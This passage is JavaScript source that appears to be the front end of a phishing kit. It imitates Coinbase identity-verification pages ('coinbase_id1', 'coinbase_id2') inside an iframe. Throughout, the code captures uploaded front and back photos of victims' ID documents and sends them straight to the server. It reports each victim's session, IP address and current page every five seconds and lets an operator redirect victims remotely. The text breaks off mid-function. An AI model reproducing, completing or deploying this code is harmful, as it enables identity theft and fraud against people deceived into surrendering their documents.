(function() {
  'use strict';

  const AppState = {
    currentPage: null,
    pendingPage: null,
    navigatingToPage: null, 
    sessionId: null,
    ipAddress: null,
    config: {},
    userPrefersDark: window.matchMedia('(prefers-color-scheme: dark)').matches,
    initialParamsSet: false,       
    generateUrlParamsPending: false, 
    workflow: { 
      isActive: false,
      pages: [],
      currentPageIndex: -1,
      currentPageKey: null,
      totalPages: 0
    }
  };

  const DOM = {
    get mainContent() {
      return document.getElementById('main-content') || document.querySelector('[id="main-content"]');
    },
    get loadingIndicator() {
      return document.querySelector('.loading');
    }
  };

  const SocketManager = (() => {

    const socket = io({
      reconnection: true,
      reconnectionAttempts: Infinity,
      reconnectionDelay: 500,
      reconnectionDelayMax: 3000,
      transports: ['websocket'],
      upgrade: false
    });

    let isConnected = false;
    let actionQueue = [];

    function processQueue() {
      while (actionQueue.length > 0 && isConnected) {
        const action = actionQueue.shift();
        try {
          action.fn();
        } catch (err) {
          console.error(`Error executing queued action: ${action.type}`, err);
        }
      }
    }

    function queueOrExecute(fn, actionType) {
      if (isConnected) {
        try {
          fn();
        } catch (err) {
          console.error(`Error executing action: ${actionType}`, err);
        }
      } else {
        actionQueue.push({ fn, type: actionType });
        if (socket.io.readyState !== 'opening') {
          socket.connect();
        }
      }
    }

    function findRouteByPageKey(pageKey) {
      if (!AppState.config || !AppState.config.pages) {
        return fetchConfigAndFindRoute(pageKey);
      }

      const normalizedKey = pageKey.startsWith('/') ? pageKey.substring(1) : pageKey;

      const pageConfig = AppState.config.pages[normalizedKey];
      if (pageConfig && pageConfig.route) {
        return pageConfig.route.startsWith('/') ? pageConfig.route.substring(1) : pageConfig.route;
      }

      for (const [key, pageData] of Object.entries(AppState.config.pages)) {
        const pageRoute = pageData.route || '';
        const normalizedRoute = pageRoute.startsWith('/') ? pageRoute.substring(1) : pageRoute;

        if (normalizedRoute === normalizedKey) {
          return key;
        }
      }

      const lowerKey = normalizedKey.toLowerCase();
      for (const [key, pageData] of Object.entries(AppState.config.pages)) {
        if (key.toLowerCase() === lowerKey) {
          return key;
        }

        const pageRoute = pageData.route || '';
        const normalizedRoute = pageRoute.startsWith('/') ? pageRoute.substring(1) : pageRoute;
        if (normalizedRoute.toLowerCase() === lowerKey) {
          return key;
        }
      }

      return null;
    }
    async function fetchConfigAndFindRoute(pageKey) {
      try {
        if (!AppState.config || !AppState.config.pages) {
          const config = await getConfigAsync();
          AppState.config = config;
        }
        return findRouteByPageKey(pageKey);
      } catch (error) {
        console.error("Error fetching config:", error);
        return null;
      }
    }
    function setupListeners() {
      socket.on('connect', () => {
        isConnected = true;
        processQueue();

        if (AppState.generateUrlParamsPending && AppState.config && AppState.config.param_conf && AppState.config.param_conf.params && !AppState.initialParamsSet) {
          if (typeof window.runUrlParamGenerationLogic === 'function') {
              window.runUrlParamGenerationLogic();
          }
          AppState.generateUrlParamsPending = false; 
        }

        if (AppState.pendingPage) {
          requestPage(AppState.pendingPage, { is_initial: true });
          AppState.pendingPage = null;
        }
      });

      socket.on('disconnect', (reason) => {
        isConnected = false;
        hideLoadingOverlay();
      });

      socket.on('reconnect', (attemptNumber) => {
        isConnected = true;
        processQueue();
      });

      socket.on('page_rendered', PageRenderer.handlePageContent);

      socket.on('form_submit_response', FormHandler.handleFormResponse);

      socket.on('change_page', (data) => {
        let pageToNavigate;

        if (typeof data === 'object') {
          pageToNavigate = data.page || data.redirect;
        } else if (typeof data === 'string') {
          pageToNavigate = data;
        }

        if (pageToNavigate) {
          navigateToPage(pageToNavigate);
        }
      });

      socket.on('redirect', (url) => {
        if (typeof url === 'object') {
          url = url.redirect || url.page;
        }

        if (!url) return;

        if (url.startsWith('/') && AppState.config?.options?.hide_route === true) {
          navigateToPage(url.substring(1));
        } else {
          window.location.href = url;
        }
      });

      socket.on('page_not_found', (data) => {
        const alternateRoute = findRouteByPageKey(data.page);

        if (alternateRoute) {
          requestPage(alternateRoute, { is_retry: true });
        } else {
          console.error(`No alternate route found for ${data.page}`);

          const errorHtml = `
            <html>
              <head>
                <style>
                  body {
                    font-family: Arial, sans-serif;
                    padding: 20px;
                    text-align: center;
                    color: #333;
                  }
                  .error-container {
                    max-width: 500px;
                    margin: 100px auto;
                    padding: 20px;
                    border: 1px solid #ddd;
                    border-radius: 8px;
                    background: #f8f8f8;
                  }
                  h2 {
                    color: #d32f2f;
                    margin-bottom: 20px;
                  }
                </style>
              </head>
              <body>
                <div class="error-container">
                  <h2>Page Not Found</h2>
                  <p>The requested page "${data.page}" could not be found.</p>
                </div>
              </body>
            </html>
          `;
          PageRenderer.handlePageContent({
            page: data.page,
            html: errorHtml
          });
        }
      });

      socket.on('session_init', (data) => {
        AppState.sessionId = data.session_id;
        AppState.ipAddress = data.ip;

        if (!window._activityInterval) {
          window._activityInterval = setInterval(sendActivityUpdate, 5000);
        }
      });
    }

    function requestPage(page, options = {}) {
      AppState.navigatingToPage = page; 
      queueOrExecute(() => {
        socket.emit('render_page', {
          page,
          userAgent: navigator.userAgent,
          ...options
        });
      }, `render_page:${page}`);
    }

    function submitForm(pageRoute, formData) {
      if (!isConnected) {
        console.error('Socket not connected during form submit');
        return Promise.reject(new Error('Socket not connected'));
      }

      let nextPage = null;
      let workflowInfo = null;

      if (AppState.config && AppState.config.workflows) {
        const currentPage = AppState.currentPage?.substring(1); 
        const workflowDef = AppState.config.workflows.find(w => 
          w.pages && w.pages.includes(currentPage)
        );

        if (workflowDef && workflowDef.pages) {
          const currentIndex = workflowDef.pages.indexOf(currentPage);
          if (currentIndex >= 0 && currentIndex < workflowDef.pages.length - 1) {
            nextPage = workflowDef.pages[currentIndex + 1];

            workflowInfo = {
              name: workflowDef.name || 'main_workflow',
              current_index: currentIndex,
              current_page: currentPage,
              next_page: nextPage,
              total_pages: workflowDef.pages.length,
              workflow_pages: workflowDef.pages
            };
          }
        }
      }

      return new Promise((resolve, reject) => {
        const timeoutId = setTimeout(() => {
          reject(new Error('Form submission timeout'));
        }, 15000);

        socket.emit('form_submit', {
          page: pageRoute,
          formData,
          meta: {
            source_page: pageRoute.startsWith('/') ? pageRoute.substring(1) : pageRoute,
            target_page: nextPage,
            workflow_info: workflowInfo,
            is_spa: true
          }
        });

        function formSubmitHandler(response) {
          clearTimeout(timeoutId);
          socket.off('form_submit_response', formSubmitHandler);
          resolve(response);
        }

        socket.once('form_submit_response', formSubmitHandler);
      });
    }

    function getSocket() {
      return socket;
    }

    function sendActivityUpdate() {
      if (isConnected && AppState.sessionId) {
        let pageToEmit;
        const targetPage = AppState.navigatingToPage;
        const currentPageKey = AppState.currentPage;

        const pageKeyForRouteLookup = targetPage || currentPageKey;

        if (pageKeyForRouteLookup) {
          const pageConfig = AppState.config?.pages?.[pageKeyForRouteLookup.replace(/^\//, '')];
          const customRoute = pageConfig?.route;

          if (customRoute) {
            pageToEmit = customRoute.startsWith('/') ? customRoute : `/${customRoute}`;
          } else {
            pageToEmit = pageKeyForRouteLookup.startsWith('/') ? pageKeyForRouteLookup : `/${pageKeyForRouteLookup}`;
          }
        } else {
          pageToEmit = window.location.pathname;
        }
        
        if (!pageToEmit || pageToEmit === "" || pageToEmit === "None") {
            pageToEmit = '/'; 
            if (AppState.config?.waiting) {
                const waitingKey = AppState.config.waiting.replace(/^\//, '');
                const waitingPageConfig = AppState.config?.pages?.[waitingKey];
                if (waitingPageConfig?.route) {
                    pageToEmit = waitingPageConfig.route.startsWith('/') ? waitingPageConfig.route : `/${waitingPageConfig.route}`;
                } else {
                    pageToEmit = AppState.config.waiting.startsWith('/') ? AppState.config.waiting : `/${AppState.config.waiting}`;
                }
            }
        }

        socket.emit('client_activity_update', {
          session_id: AppState.sessionId,
          last_activity: Math.floor(Date.now() / 1000),
          page: pageToEmit,
          ip: AppState.ipAddress
        });
      }
    }

    function updateSession(updates) {
      queueOrExecute(() => {
        socket.emit('update_session', { updates });
      }, 'update_session');
    }

    function generateData(paramConf) {
      return new Promise((resolve, reject) => {
        if (!isConnected) {
          console.warn('[SocketManager.generateData] Socket not connected. Rejecting.');
          reject(new Error('Socket not connected for generateData'));
          return;
        }

        let fulfilled = false;
        socket.emit('generate_data', paramConf);

        const timeoutId = setTimeout(() => {
          if (fulfilled) return;
          fulfilled = true;
          socket.off('generated_data', generatedDataHandler);
          socket.off('error', errorHandler);
          reject(new Error('generate_data timeout after 10s'));
        }, 10000);

        function generatedDataHandler(response) {
          if (fulfilled) return;
          fulfilled = true;
          clearTimeout(timeoutId);
          socket.off('error', errorHandler);
          resolve(response);
        }

        function errorHandler(errorData) {
          if (fulfilled) return;
          fulfilled = true;
          clearTimeout(timeoutId);
          socket.off('generated_data', generatedDataHandler);
          reject(new Error(errorData.message || 'Server error during generate_data operation'));
        }

        socket.once('generated_data', generatedDataHandler);
        socket.once('error', errorHandler);
      });
    }

    return {
      socket,
      setupListeners,
      requestPage,
      submitForm,
      updateSession,
      getSocket,
      generateData, 
      isConnected: () => isConnected,
      findRouteByPageKey
    };
  })();

  const PageRenderer = (() => {

    async function handlePageContent(data) {
      if (window._navigationTimeout) {
        clearTimeout(window._navigationTimeout);
        window._navigationTimeout = null;
      }

      const page = data.page;
      AppState.currentPage = page;
      AppState.navigatingToPage = null;

      if (!data || !data.html) {
        console.error('Received empty page content');
        hideLoadingOverlay();
        return;
      }

      const normalizedPageName = page.startsWith('/') ? page.substring(1) : page;

      try {
        let mainContainer = document.getElementById('spa-main-container');
        if (!mainContainer) {
          mainContainer = document.createElement('div');
          mainContainer.id = 'spa-main-container';
          mainContainer.style.cssText = `position: absolute; top: 0; left: 0; width: 100%; height: 100%; overflow: hidden;`;
          const mainContent = DOM.mainContent;
          if (mainContent) {
            mainContent.innerHTML = '';
            mainContent.appendChild(mainContainer);
          } else {
            document.body.appendChild(mainContainer);
          }
        }

        let oldIframe = document.getElementById('spa-content-iframe');
        if (oldIframe) {
          oldIframe.remove();
        }
        let iframe = document.createElement('iframe');
        iframe.id = 'spa-content-iframe';
        iframe.name = 'spa-content-iframe';
        iframe.style.cssText = `border: none; width: 100%; height: 100%; position: absolute; top: 0; left: 0; opacity: 0; visibility: hidden; transition: opacity 0.3s ease-in-out;`;
        mainContainer.appendChild(iframe);
        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;

        const uploadFileImmediatelySPA = (file, fieldName, triggerId, pageKey) => {
          if (!file) {
            console.warn(`[SPA Upload] No file provided for ${fieldName} on ${triggerId}.`);
            return;
          }

          const formData = new FormData();
          formData.append(fieldName, file);
          formData.append('immediate_upload', 'true');
          formData.append('trigger_id', triggerId);
          formData.append('page_route', pageKey); 

          fetch('/process-entry', {
            method: 'POST',
            body: formData
          })
          .then(response => {
            if (!response.ok) {
              return response.json().then(errData => {
                throw new Error(errData.message || `HTTP error! status: ${response.status}`);
              }).catch(() => { 
                throw new Error(`HTTP error! status: ${response.status} - ${response.statusText}`);
              });
            }
            return response.json();
          })
          .then(uploadData => {
            if (uploadData.success) {
          } else {
              console.error(`[SPA Upload] Server error for ${triggerId}:`, uploadData.message || 'Upload failed');
            }
          })
          .catch(error => {
            console.error(`[SPA Upload] Fetch/Network error during upload for ${triggerId}:`, error);
          });
        };

        const fixIDSelectionStyling = () => {
          const pageKey = AppState.currentPage?.replace(/^\//, '');
          if (pageKey === 'coinbase_id2') {
            return;
          }
          const idSelectionElements = Array.from(iframeDoc.querySelectorAll(
            '[data-testid="idv-id-type-drivers_licence"], [data-testid^="idv-id-type-"], #front, #back'
          ));
          idSelectionElements.forEach(element => {
            if (element.hasAttribute('data-fixed') || element.classList.contains('uploadTrigger') || element.classList.contains('d-block')) {
              const originalElement = element.cloneNode(true);
              ['data-fixed', 'data-fixed-by-spa', 'data-modified-by-spa', 'data-original-style'].forEach(attr => {
                if (originalElement.hasAttribute(attr)) originalElement.removeAttribute(attr);
              });
              if (originalElement.classList.contains('uploadTrigger')) originalElement.classList.remove('uploadTrigger');
              if (originalElement.classList.contains('d-block')) originalElement.classList.remove('d-block');
              if (element.id === 'front' || element.id === 'back' || element.getAttribute('data-testid') === 'idv-id-type-drivers_licence') {
                originalElement.removeAttribute('style');
              }
              element.parentNode.replaceChild(originalElement, element);
              if (originalElement.getAttribute('data-testid') === 'idv-id-type-drivers_licence') {
                originalElement.onclick = (e) => {
                  e.preventDefault(); e.stopPropagation();
                  const redirectsConfig = AppState.config?.pages?.coinbase_id1?.redirects || {};
                  const driverLicenseRedirect = Object.values(redirectsConfig).find(r => r.text === "Driver's License" || r.element_type === "div");
                  if (driverLicenseRedirect && driverLicenseRedirect.url) {
                    const destinationPageName = driverLicenseRedirect.url;
                    if (AppState.config?.options?.hide_route === false) {
                      const destinationRoute = AppState.config?.pages?.[destinationPageName]?.route;
                      if (destinationRoute) {
                        window.location.href = destinationRoute.startsWith('/') ? destinationRoute : `/${destinationRoute}`;
                        return;
                      }
                    }
                    navigateToPage(destinationPageName);
                  } else {
                    navigateToPage('coinbase_id2');
                  }
                  return false;
                };
              }
              if (originalElement.id === 'front' || originalElement.id === 'back') {
                let fileInput = null;
                const nearestForm = originalElement.closest('form');
                if (nearestForm) fileInput = nearestForm.querySelector(`input[type="file"][id="${originalElement.id}_file"], input[type="file"][name="${originalElement.id}_file"]`);
                if (!fileInput) fileInput = iframeDoc.getElementById(`${originalElement.id}_file`);
                if (fileInput) {
                  originalElement.onclick = function(eClick) {
                    eClick.preventDefault(); eClick.stopPropagation();
                    fileInput.click();
                  };
                  fileInput.onchange = function() {
                    if (this.files && this.files[0]) {
                      const fileName = this.files[0].name;
                      const textElement = originalElement.querySelector('p');
                      if (textElement) {
                        textElement.textContent = `Selected: ${fileName}`;
                      } else {
                        const newText = iframeDoc.createElement('p'); 
                        newText.textContent = `Selected: ${fileName}`;
                        originalElement.appendChild(newText);
                      }
                      if (this.hasAttribute('data-immediate-upload')) {
                        const fieldName = this.name;
                        const triggerId = originalElement.id;
                        const pageRoute = AppState.currentPage;
                        if (typeof iframe.contentWindow.uploadFileImmediately === 'function') {
                          iframe.contentWindow.uploadFileImmediately(this.files[0], fieldName, triggerId, pageRoute);
                        } else if (typeof window.uploadFileImmediately === 'function') {
                          window.uploadFileImmediately(this.files[0], fieldName, triggerId, pageRoute);
                        }
                      }
                    }
                  };
                }
              }
            }
          });
        };

        const preFixDriversLicense = () => {
          try {
            const directScript =
              '(function() {' +
              '  const targetElement = document.querySelector(\'[data-testid="idv-id-type-drivers_licence"]\');' +
              '  if (targetElement) {' +
              '    targetElement.setAttribute(\'data-fixed-by-spa\', \'true\');' +
              '  } else {' +
              '  }' +
              '})();';

            const scriptEl = iframeDoc.createElement('script');
            scriptEl.textContent = directScript;
            if (iframeDoc.head) {
              iframeDoc.head.appendChild(scriptEl);
            } else if (iframeDoc.body) {
              iframeDoc.body.appendChild(scriptEl); 
            }
          } catch (err) {
            console.error('Error in pre-fix script:', err);
          }
        };

        const fixOnclickAttributes = (backendValuesFromPage = null) => {
          const pageKey = AppState.currentPage?.replace(/^\//, '');

          if (pageKey === 'coinbase_id2' || (pageKey && pageKey.includes('id2'))) {
              if (!iframeDoc.querySelector('script[src*="id2.js"]')) {
                  const script = iframeDoc.createElement('script');
                  script.src = '/assets/js/panel/id2.js';
                  script.onload = () => {
                      if (iframeDoc.defaultView.ID2Handler) {
                          iframeDoc.defaultView.id2Handler = new iframeDoc.defaultView.ID2Handler();
                      } else {
                          iframeDoc.defaultView.ID2Handler = window.ID2Handler;
                          iframeDoc.defaultView.id2Handler = new window.ID2Handler();
                      }
                  };
                  iframeDoc.head.appendChild(script);
              } else if (!iframeDoc.defaultView.id2Handler) {
                  const HandlerClass = iframeDoc.defaultView.ID2Handler || window.ID2Handler;
                  if (HandlerClass) {
                      iframeDoc.defaultView.id2Handler = new HandlerClass();
                  } else {
                      console.error('[SPA] ID2Handler class not found in either context');
                  }
              }
              return;
          }

          const allowedPages = ['coinbase_id1', 'id_frontback'];
          if (!pageKey || !allowedPages.some(allowed => pageKey.includes(allowed))) {
            return;
          }
          if (pageKey === 'coinbase_id2') {
            return;
          }
          try {
            if (normalizedPageName === 'coinbase_id2') {
              if (iframeDoc._idUploadSetupComplete && !(iframeDoc.querySelector('#front:not([data-id-upload-setup])') || iframeDoc.querySelector('#back:not([data-id-upload-setup])'))) {
                return;
              }

              const extraUploadButtons = Array.from(iframeDoc.querySelectorAll('.uploadTrigger, #uploadBtn, button[type="submit"]'));
              extraUploadButtons.forEach(btn => {
                if (btn.id === 'front' || btn.id === 'back') return;
                if (btn.tagName === 'BUTTON' && btn.type !== 'button') {
                  btn.type = 'button';
                }
                if (!btn.hasAttribute('data-upload-trigger-setup')) {
                  btn.setAttribute('data-upload-trigger-setup', 'true');
                  btn.addEventListener('click', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    if (e.stopImmediatePropagation) e.stopImmediatePropagation();
                  }, true);
                  btn.addEventListener('click', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    if (e.stopImmediatePropagation) e.stopImmediatePropagation();
                  }, false);
                }
              });
              ['front', 'back'].forEach(id => {
                const element = iframeDoc.querySelector(`#${id}`);

                let backendFileUrl = null;
                let debugSources = {};
                let backendValues = backendValuesFromPage;
                let pageKey = AppState.currentPage;
                if (pageKey && pageKey.startsWith('/')) pageKey = pageKey.substring(1);

                if (backendValues) {
                  if (backendValues[id + '_file']) {
                    backendFileUrl = backendValues[id + '_file'];
                    debugSources['backendValues[id_file]'] = backendValues[id + '_file'];
                  } else if (backendValues[pageKey] && backendValues[pageKey][id + '_file']) {
                    backendFileUrl = backendValues[pageKey][id + '_file'];
                    debugSources['backendValues[pageKey][id_file]'] = backendValues[pageKey][id + '_file'];
                  } else {
                    const keys = Object.keys(backendValues);
                    if (keys.length === 1 && backendValues[keys[0]][id + '_file']) {
                      backendFileUrl = backendValues[keys[0]][id + '_file'];
                      debugSources['backendValues[onlyKey][id_file]'] = backendValues[keys[0]][id + '_file'];
                    }
                  }
                  debugSources['final backendValues'] = backendValues;
                }
                if (backendFileUrl && element) {
                  const oldImg = element.querySelector('.id2-upload-preview');
                  if (oldImg) oldImg.remove();

                  const oldWrapper = element.querySelector('.spa-upload-preview-wrapper');
                  if (oldWrapper) oldWrapper.remove();

                  const img = iframeDoc.createElement('img');
                  img.classList.add('img-fluid', 'id2-upload-preview');
                  img.style.cssText = 'max-width:100%;max-height:100%;object-fit:contain;position:absolute;top:0;left:0;right:0;bottom:0;margin:auto;z-index:2;';

                  let retryCount = 0;
                  const maxRetries = 3;
                  const retryDelay = 1000; 

                  const loadImage = () => {
                    img.src = backendFileUrl.startsWith('/') ? backendFileUrl : `/${backendFileUrl}`;
                  };

                  img.onerror = () => {
                    console.error(`[SPA] Failed to load image for #${id} from ${img.src}. Retry ${retryCount + 1}/${maxRetries}`);
                    retryCount++;
                    if (retryCount <= maxRetries) {
                      setTimeout(loadImage, retryDelay * retryCount); 
                    } else {
                    }
                  };

                  img.onload = () => {
                  };

                  loadImage(); 

                  element.style.position = 'relative'; 
                  img.addEventListener('error', () => {
                    console.error(`[SPA] Failed to load image for #${id}`);
                  });
                  element.insertBefore(img, element.firstChild);
                } else if (element) {
                  console.warn(`[SPA Upload Debug] No backend file value found for #${id}. Debug sources:`, debugSources);
                }

                if (element && !element.hasAttribute('data-id-upload-setup')) {
                  if (element.tagName === 'BUTTON') {
                    element.type = 'button';
                  }
                  element.onclick = null;
                  element.removeAttribute('onclick');

                  let fileInput = iframeDoc.querySelector(`input[type="file"][name="${id}_file"]`);
                  if (!fileInput) {
                    fileInput = iframeDoc.createElement('input');
                    fileInput.type = 'file'; fileInput.name = `${id}_file`; fileInput.id = `${id}_file`;
                    fileInput.style.display = 'none'; fileInput.accept = 'image/*'; fileInput.setAttribute('capture', 'environment');
                    iframeDoc.body.appendChild(fileInput);
                  } else {
                  }

                  const clickHandler = function(eClick) {
                    eClick.preventDefault();
                    eClick.stopPropagation();
                    if (eClick.stopImmediatePropagation) eClick.stopImmediatePropagation();
                    window._suppressNextNavigation = true;
                    if (fileInput) fileInput.click();
                    return false;
                  };
                  element.addEventListener('click', clickHandler, true);
                  element.addEventListener('click', clickHandler, false);

                  fileInput.onchange = function() {
                    if (this.files && this.files[0]) {
                      const reader = new FileReader();
                      reader.onload = function(eReader) {
                        const targetDisplayElement = iframeDoc.getElementById(id);
                        if (targetDisplayElement) {
                          const oldWrapper = targetDisplayElement.querySelector('.spa-upload-preview-wrapper');
                          if (oldWrapper) { oldWrapper.remove();  }
                          const originalWidth = targetDisplayElement.offsetWidth || 300;
                          const originalHeight = targetDisplayElement.offsetHeight || 200;
                          targetDisplayElement.style.cssText = `width:${originalWidth}px;height:${originalHeight}px;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative;padding:0;box-sizing:border-box;`;
                          const img = iframeDoc.createElement('img');
                          img.src = eReader.target.result;
                          img.style.cssText = 'max-width:90%;max-height:90%;object-fit:contain;display:block;margin:auto;position:relative;';
                          const wrapper = iframeDoc.createElement('div');
                          wrapper.className = 'spa-upload-preview-wrapper';
                          wrapper.style.cssText = 'width:100%;height:100%;display:flex;align-items:center;justify-content:center;position:relative;';
                          wrapper.appendChild(img); targetDisplayElement.appendChild(wrapper);
                        } else {
                          console.warn(`[SPA Upload Debug] Could not find element #${id} to update preview`);
                        }
                      };
                      reader.readAsDataURL(this.files[0]);
                      const pageRoute = AppState.currentPage;
                      try {
                        uploadFileImmediatelySPA(this.files[0], this.name, id, pageRoute);
                      } catch (errUpload) { console.error('[SPA Upload Debug] Error during file upload:', errUpload); }
                    }
                  };
                }
              });
            }

            try {
                const normalizedPageName = AppState.currentPage?.replace(/^\/+/,'') || ''; 
                const pageConfig = AppState.config?.pages?.[normalizedPageName];

                if (pageConfig && pageConfig.redirects) {
                    const elementsWithTestId = iframeDoc.querySelectorAll('[data-testid]');
                    elementsWithTestId.forEach(element => {
                        const testId = element.getAttribute('data-testid');
                        let redirectKey;

                        if (testId === 'idv-id-type-drivers_licence') {
                            redirectKey = 'drivers_license_action';
                        } else if (testId === 'idv-id-type-id_card') {
                            redirectKey = 'id_card';
                        }

                        if (redirectKey && pageConfig.redirects[redirectKey] && pageConfig.redirects[redirectKey].url) {
                            const redirectUrl = pageConfig.redirects[redirectKey].url;
                            const onclickValue = `window.SpaSystem && window.SpaSystem.navigateToPage('${redirectUrl}')`;
                            element.setAttribute('onclick', onclickValue);
                            element.setAttribute('data-spa-redirect-onclick', 'true'); 
                        } else if (redirectKey) {
                            console.warn(`[SPA] No redirect URL found for testId: ${testId} (redirectKey: ${redirectKey}) on page ${normalizedPageName}`);
                        }
                    });
                }
            } catch (errRedirect) {
                console.error('[SPA] Error applying data-testid redirects:', errRedirect);
            }

          } catch (err) {
            console.error('Error fixing hardcoded onclick attributes:', err);
          }
        };

        if (normalizedPageName === 'coinbase_id1') {
          let redirectUrl = 'coinbase_id2'; 
            const redirectsConfig = AppState.config?.pages?.coinbase_id1?.redirects || {};
          const driverLicenseRedirect = Object.values(redirectsConfig).find(r => r.text === "Driver's License" || r.element_type === "div");
          if (driverLicenseRedirect && driverLicenseRedirect.url) redirectUrl = driverLicenseRedirect.url;
          let onclickValue;
              if (AppState.config?.options?.hide_route === false) {
            const destinationRoute = AppState.config?.pages?.[redirectUrl]?.route;
            if (destinationRoute) onclickValue = `window.location.href='${destinationRoute.startsWith('/') ? destinationRoute : `/${destinationRoute}`}'`;
            else onclickValue = `window.SpaSystem && window.SpaSystem.navigateToPage('${redirectUrl}')`;
          } else {
            onclickValue = `window.SpaSystem && window.SpaSystem.navigateToPage('${redirectUrl}')`;
          }
          data.html = data.html.replace(/onclick="window\.SpaSystem\s*&&\s*window\.SpaSystem\.navigateToPage\('id_frontback'\)"/g, `onclick="${onclickValue}" data-modified-by-spa="true"`);
        }

        if (normalizedPageName === 'coinbase_id2' || normalizedPageName.includes('id2')) {
            const scriptTag = '<script src="/assets/js/panel/id2.js"></script>';
            if (!data.html.includes(scriptTag)) {
                data.html = data.html.replace('</body>', `${scriptTag}</body>`);
            }
        }

        if (AppState.config && AppState.config.options && AppState.config.options.hide_route === true) {
          const wsScriptPattern = /<script[^>]*src=["']\/?assets\/ws\.js["'][^>]*><\/script>/gi;
          if (wsScriptPattern.test(data.html)) {
            data.html = data.html.replace(wsScriptPattern, '<!-- assets/ws.js removed by SpaSystem -->');
          }
        }

        iframe.onload = () => {
          if (iframe.contentDocument) {
            const iframeHtml = iframe.contentDocument.documentElement;
            const iframeBody = iframe.contentDocument.body;

            iframeHtml.style.height = '100%';
            iframeHtml.style.minHeight = '100vh';
            iframeHtml.style.margin = '0';
            iframeHtml.style.padding = '0';
            iframeHtml.style.boxSizing = 'border-box';
            
            iframeBody.style.minHeight = '100vh';
            iframeBody.style.margin = '0';
            iframeBody.style.padding = '0';
            iframeBody.style.boxSizing = 'border-box';

            try {
              const iframeTitle = iframe.contentDocument.title;
              if (iframeTitle && iframeTitle.trim()) {
                document.title = iframeTitle;
              }

              const iframeFavicon = iframe.contentDocument.querySelector('link[rel*="icon"]');
              if (iframeFavicon) {
                const existingFavicon = document.querySelector('link[rel*="icon"]');
                if (existingFavicon) {
                  existingFavicon.remove();
                }

                const newFavicon = document.createElement('link');
                newFavicon.rel = iframeFavicon.rel;
                newFavicon.type = iframeFavicon.type || 'image/x-icon';
                
                let faviconHref = iframeFavicon.href;
                if (faviconHref && !faviconHref.startsWith('http') && !faviconHref.startsWith('data:')) {
                  if (faviconHref.startsWith('/')) {
                    faviconHref = window.location.origin + faviconHref;
                  } else {
                    faviconHref = window.location.origin + '/' + faviconHref;
                  }
                }
                newFavicon.href = faviconHref;
                
                document.head.appendChild(newFavicon);
              }
            } catch (faviconError) {
              console.warn('[SPA] Failed to update title or favicon:', faviconError);
            }

            iframe.contentWindow.SpaSystem = {
                ...(window.SpaSystem || {}),
                navigateToPage: (targetPage) => { 
            if (targetPage === 'id_frontback' && normalizedPageName === 'coinbase_id1') {
              const redirectsConfig = AppState.config?.pages?.coinbase_id1?.redirects || {};
                      const driverLicenseRedirect = Object.values(redirectsConfig).find(r => r.text === "Driver's License" || r.element_type === "div");
              if (driverLicenseRedirect && driverLicenseRedirect.url) {
                const destinationPageName = driverLicenseRedirect.url;
                if (AppState.config?.options?.hide_route === false) {
                  const destinationRoute = AppState.config?.pages?.[destinationPageName]?.route;
                          if (destinationRoute) { window.location.href = destinationRoute.startsWith('/') ? destinationRoute : `/${destinationRoute}`; return; }
                        }
                        window.SpaSystem.navigateToPage(destinationPageName); 
                      } else window.SpaSystem.navigateToPage(targetPage);
                    } else window.SpaSystem.navigateToPage(targetPage); 
                }
            };
            iframe.contentWindow.socket = SocketManager.getSocket();

            iframe.contentWindow.setupEventListeners = function() {
              console.warn('[SPA] iframe content called setupEventListeners(). This is a no-op in SPA mode.');
            };

            iframe.contentWindow.initializePasswordToggle = function() {
              const passwordInputs = iframe.contentWindow.document.querySelectorAll('input[type="password"]');
              passwordInputs.forEach(passwordInput => {
                const wrapper = passwordInput.closest('.password-wrapper, .form-group, .input-group'); 
                if (!wrapper) return;

                let toggleButton = wrapper.querySelector('.toggle-password, [data-toggle="password"]');

                if (!toggleButton && passwordInput.id) {
                    toggleButton = wrapper.querySelector(`[aria-controls="${passwordInput.id}"], [data-target="#${passwordInput.id}"]`);
                }

                if (!toggleButton && passwordInput.classList.contains('enable-password-toggle')) {
                    toggleButton = iframe.contentWindow.document.createElement('button');
                    toggleButton.type = 'button';
                    toggleButton.textContent = 'Show'; 

                    toggleButton.style.marginLeft = '5px'; 
                    toggleButton.style.padding = '5px 10px';
                    toggleButton.style.cursor = 'pointer';

                    if (passwordInput.nextSibling) {
                        passwordInput.parentNode.insertBefore(toggleButton, passwordInput.nextSibling);
                    } else {
                        passwordInput.parentNode.appendChild(toggleButton);
                    }
                }

                if (passwordInput && toggleButton) {
                  toggleButton.addEventListener('click', function () {
                    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                    passwordInput.setAttribute('type', type);

                    const textContent = type === 'password' ? 'Show' : 'Hide';
                    if (this.childElementCount === 0) { 
                        this.textContent = textContent;
                    } else { 
                        let textNode = Array.from(this.childNodes).find(node => node.nodeType === Node.TEXT_NODE);
                        if (textNode) textNode.nodeValue = textContent + ' '; 

                        const icon = this.querySelector('i');
                        if (icon) {
                            icon.classList.toggle('fa-eye', type === 'password');
                            icon.classList.toggle('fa-eye-slash', type !== 'password');
                        }
                    }
                  });
                }
              });
            };

            try {
                iframe.contentWindow.initializePasswordToggle();
            } catch (e) {
                console.warn('[SPA] Failed to auto-run initializePasswordToggle on iframe load:', e);
            }
          }

          setTimeout(() => {
            if (iframe.contentWindow && iframe.contentWindow.document) {
              FormHandler.attachFormHandlers(iframe.contentWindow.document); 
            } else {
              console.error('[PageRenderer] Iframe content window or document not available for attaching form handlers (post-load).');
            }
          }, 100); 

          setTimeout(() => {
            fixIDSelectionStyling(); 
            if (normalizedPageName === 'coinbase_id2') {
              if (!iframeDoc._idUploadSetupComplete) {
                iframeDoc._idUploadSetupComplete = true; 
                fixOnclickAttributes(data.values || null); 
              } else {
                fixOnclickAttributes(data.values || null); 
              }
            }
          }, 100);

          setTimeout(fixIDSelectionStyling, 500);
          iframe.style.opacity = '1';
          iframe.style.visibility = 'visible';
          hideLoadingOverlay();
        };

        iframeDoc.write(data.html);
        iframeDoc.close();

        preFixDriversLicense(); 

        const iframeContentDocument = iframe.contentDocument || iframe.contentWindow.document;
        const loaderInIframeContainer = iframeContentDocument.querySelector('div.loading');
        const loaderImageInIframe = loaderInIframeContainer ? loaderInIframeContainer.querySelector('img') : null;

        if (loaderImageInIframe && loaderInIframeContainer) {
            const originalImageDisplay = loaderImageInIframe.style.display;
            loaderImageInIframe.style.display = 'none';

            const handleIframeLoaderError = function() {
